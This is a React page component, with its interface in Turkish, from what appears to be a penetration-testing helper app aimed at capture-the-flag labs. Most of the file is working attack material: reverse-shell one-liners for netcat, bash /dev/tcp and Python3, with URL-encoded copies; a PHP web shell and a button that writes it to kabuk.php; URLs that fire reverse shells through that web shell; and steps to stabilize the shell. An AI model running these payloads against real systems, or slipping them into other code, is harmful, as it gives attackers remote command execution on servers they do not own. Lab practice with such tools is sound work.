import { useRef, useState } from 'react';
import { useJobs } from '../context/JobContext';
import { useSocket } from '../context/SocketContext';
import { useTerminal } from '../hooks/useTerminal';
import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
import { sendCmd } from '../utils/helpers';

const termId = 'shell-main';

const SHELLS = [
  {
    id: 1,
    title: '1. NC Reverse Shell (en uyumlu)',
    cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KENDI_IP PORT >/tmp/f',
    urlEncoded: 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20KENDI_IP%20PORT%20%3E%2Ftmp%2Ff',
    desc: 'Netcat ile reverse shell – çoğu sistemde çalışır. rm ve mkfifo gerektir.',
    color: 'green',
  },
  {
    id: 2,
    title: '2. Bash Reverse Shell',
    cmd: `bash -c 'bash -i >& /dev/tcp/KENDI_IP/PORT 0>&1'`,
    urlEncoded: `bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKENDI_IP%2FPORT%200%3E%261'`,
    desc: 'Bash built-in /dev/tcp ile – Basit ve temiz. Bash olması ŞART.',
    color: 'cyan',
  },
  {
    id: 3,
    title: '3. Python3 Reverse Shell',
    cmd: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KENDI_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
    urlEncoded: `python3%20-c%20'import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect(("KENDI_IP"%2CPORT))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn("%2Fbin%2Fbash")'`,
    desc: 'Python3 socket ile – pty.spawn sayesinde tam etkileşimli shell. Python3 olması ŞART.',
    color: 'purple',
  },
];

function ShellTerminal() {
  const containerRef = useRef(null);
  const { isReady } = useTerminal(termId, containerRef);
  return (
    <div className="terminal-container" style={{ height: 220 }}>
      <div className="terminal-titlebar">
        <div className="terminal-dots">
          <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
        </div>
        <div className="terminal-title">
          {isReady ? <span style={{ color: 'var(--accent-green)' }}>● nc dinleyici</span> : <span style={{ color: 'var(--text-muted)' }}>○ bağlanıyor...</span>}
        </div>
      </div>
      <div ref={containerRef} style={{ height: 182, padding: '4px 2px' }} />
    </div>
  );
}

export default function PhpShellPage({ onBack }) {
  const { activeJob, updateJob } = useJobs();
  const { socket } = useSocket();
  const [myIp, setMyIp] = useState('10.10.x.x');
  const [port, setPort] = useState('4444');
  const [targetIp, setTargetIp] = useState(activeJob?.ip || '');
  const [tab, setTab] = useState('shells');

  const replaceShell = (cmd) => cmd.replace(/KENDI_IP/g, myIp).replace(/PORT/g, port);
  const replaceUrl = (cmd) => cmd.replace(/KENDI_IP/g, myIp).replace(/PORT/g, port).replace(/port/g, port);

  const listen = () => sendCmd(socket, termId, `nc -lnvp ${port}`);

  const uploadShell = () => sendCmd(socket, termId, `echo '<?php system($_GET["cmd"]); ?>' > kabuk.php`);

  return (
    <div>
      <div className="page-header">
        <div>
          <div className="page-header-back" onClick={onBack}>← Ana Menü</div>
          <div className="page-title">🐚 <span>PHP Shell</span></div>
          <div className="page-subtitle">Web shell oluşturma ve reverse shell alma</div>
        </div>
      </div>

      <div className="page-tabs">
        {['shells', 'webshell', 'stabilize'].map(t => (
          <div key={t} className={`page-tab ${tab === t ? 'active' : ''}`} onClick={() => setTab(t)}>
            {t === 'shells' ? '🐚 Reverse Shell' : t === 'webshell' ? '🌐 Web Shell' : '⬆ Shell İyileştirme'}
          </div>
        ))}
      </div>

      {tab === 'shells' && (
        <>
          <div style={{ display: 'flex', gap: 10, marginBottom: 16, flexWrap: 'wrap', alignItems: 'flex-end' }}>
            <div className="form-group" style={{ flex: 1 }}>
              <label className="form-label">Kendi IP'n (Kali/tun0)</label>
              <input className="form-input" value={myIp} onChange={e => setMyIp(e.target.value)} placeholder="10.10.x.x" />
            </div>
            <div className="form-group">
              <label className="form-label">Dinleme Portu</label>
              <input className="form-input" value={port} onChange={e => setPort(e.target.value)} style={{ width: 90 }} />
            </div>
            <button className="btn btn-green" onClick={listen}>👂 NC Dinle</button>
          </div>

          <ShellTerminal />

          <div style={{ marginTop: 16 }}>
            {SHELLS.map(s => (
              <div key={s.id} className="info-panel" style={{ marginBottom: 12 }}>
                <div className="info-panel-header" style={{ cursor: 'default', color: `var(--accent-${s.color === 'green' ? 'green' : s.color === 'cyan' ? 'cyan' : 'purple'})` }}>
                  {s.title}
                </div>
                <div className="info-panel-body">
                  <div className="cmd-desc">{s.desc}</div>
                  <div className="cmd-row">
                    <div className="cmd-box" style={{ fontSize: 11 }}>{replaceShell(s.cmd)}</div>
                    <button className="cmd-send-btn" onClick={() => navigator.clipboard.writeText(replaceShell(s.cmd))}>📋</button>
                  </div>
                  <div style={{ marginTop: 8 }}>
                    <div style={{ fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 }}>URL Encoded (cmd= ile kullan):</div>
                    <div className="cmd-box" style={{ fontSize: 10, color: 'var(--accent-yellow)' }}>
                      ?cmd={replaceUrl(s.urlEncoded)}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>

          <InfoCard title="Shell'ler Arasındaki Farklar" icon="🆚" color="orange">
            <div className="cmd-desc">
              <b>1. NC (mkfifo)</b>: En uyumlu. nc'nin <code>-e</code> bayrağını desteklemediği sistemlerde çalışır. mkfifo FIFO pipe şarttır.<br /><br />
              <b>2. Bash /dev/tcp</b>: Ekstra araç gerektirmez, sadece bash. Ama bazı minimal sistemlerde /dev/tcp olmayabilir.<br /><br />
              <b>3. Python3 pty</b>: <code>pty.spawn()</code> ile hemen etkileşimli terminal açar. Tab tamamlama çalışır.
              python3 mutlaka yüklü olmalı.
            </div>
          </InfoCard>
        </>
      )}

      {tab === 'webshell' && (
        <>
          <div className="alert alert-orange">
            <span>⚠</span>
            <span>Web shell, sunucuya PHP kodu yükleyerek tarayıcıdan sistem komutu çalıştırmayı sağlar.</span>
          </div>
          <SectionTitle icon="🌐">Web Shell Oluşturma</SectionTitle>
          <InfoCard title="Basit PHP Web Shell" icon="🐚" defaultOpen color="green">
            <div className="cmd-desc">Sunucuya yüklenecek PHP kodu:</div>
            <div className="cmd-box" style={{ fontSize: 12, marginBottom: 8 }}>{'<?php echo system($_GET[\'komut\']); ?>'}</div>
            <div className="cmd-desc">veya daha modern:</div>
            <div className="cmd-row">
              <div className="cmd-box" style={{ fontSize: 12 }}>{'<?php system($_GET["cmd"]); ?>'}</div>
              <button className="cmd-send-btn" onClick={() => navigator.clipboard.writeText('<?php system($_GET["cmd"]); ?>')}>📋</button>
            </div>
          </InfoCard>
          <InfoCard title="Shell Oluşturma & Yükleme" icon="⬆" color="purple">
            <CmdLine cmd={`echo '<?php system($_GET["cmd"]); ?>' > kabuk.php`} desc="kabuk.php dosyasını oluştur ve terminale gönder" termId={termId} />
            <div className="cmd-desc" style={{ marginTop: 8 }}>Yüklendikten sonra URL'den kullan:</div>
            <div className="cmd-box" style={{ fontSize: 11, marginBottom: 6 }}>{`http://${targetIp || '10.10.10.10'}/kabuk.php?cmd=whoami`}</div>
            <div className="cmd-box" style={{ fontSize: 11, marginBottom: 6 }}>{`http://${targetIp || '10.10.10.10'}/kabuk.php?cmd=id`}</div>
            <div className="cmd-box" style={{ fontSize: 11 }}>{`http://${targetIp || '10.10.10.10'}/kabuk.php?cmd=cat /var/www/flag.txt`}</div>
          </InfoCard>
          <InfoCard title="URL'den Reverse Shell Tetikleme" icon="🚀" color="orange">
            <div className="cmd-desc">NC dinlerken (?cmd= ile URL'den shell tetikleme):</div>
            <div className="cmd-box" style={{ fontSize: 10, wordBreak: 'break-all', marginBottom: 8 }}>
              {`http://${targetIp || 'hedef.htb'}/kabuk.php?cmd=`}
              {replaceUrl(SHELLS[0].urlEncoded)}
            </div>
            <div className="cmd-desc" style={{ marginTop: 8 }}>Bash ile:</div>
            <div className="cmd-box" style={{ fontSize: 10, wordBreak: 'break-all' }}>
              {`http://${targetIp || 'hedef.htb'}/kabuk.php?cmd=`}
              {replaceUrl(SHELLS[1].urlEncoded)}
            </div>
          </InfoCard>
        </>
      )}

      {tab === 'stabilize' && (
        <>
          <InfoCard title="Shell İyileştirme – Neden Gerekli?" icon="❓" defaultOpen color="purple">
            <div className="cmd-desc">
              Raw reverse shell'ler <b>etkileşimsizdir</b>: Ctrl+C kapanır, tab çalışmaz, vim açılmaz.
              Aşağıdaki adımlarla tam etkileşimli terminale dönüştür.
            </div>
          </InfoCard>
          <SectionTitle icon="⬆">Adım Adım Shell İyileştirme</SectionTitle>
          <InfoCard title="Adım 1 – PTY Spawn (Hedef Makinede)" icon="1️⃣" color="green">
            <CmdLine cmd={`python3 -c 'import pty; pty.spawn("/bin/bash")'`} desc="ya da: python -c ... | script /dev/null -c bash" />
          </InfoCard>
          <InfoCard title="Adım 2 – Kendi Terminalinde (Kali)" icon="2️⃣" color="cyan">
            <div className="cmd-desc"><b>Önce Ctrl+Z</b> ile shell'i arka plana at:</div>
            <div className="cmd-box" style={{ marginBottom: 8 }}>Ctrl + Z</div>
            <div className="cmd-desc">Sonra:</div>
            <CmdLine cmd="stty raw -echo; fg" desc="Ham mod + echo kapat + shell'i ön plana getir" />
          </InfoCard>
          <InfoCard title="Adım 3 – Terminal Ayarları (Hedef'te)" icon="3️⃣" color="orange">
            <CmdLine cmd="export TERM=xterm" desc="Terminal tipini ayarla" />
            <CmdLine cmd="stty rows 24 cols 80" desc="Terminal boyutunu ayarla (kendi terminaline göre değiştir)" />
          </InfoCard>
          <div className="alert alert-green" style={{ marginTop: 8 }}>
            <span>✅</span>
            <span>Artık tam etkileşimli shell'in var! Tab tamamlama, Ctrl+C, vim, sudo hepsi çalışır.</span>
          </div>
        </>
      )}
    </div>
  );
}
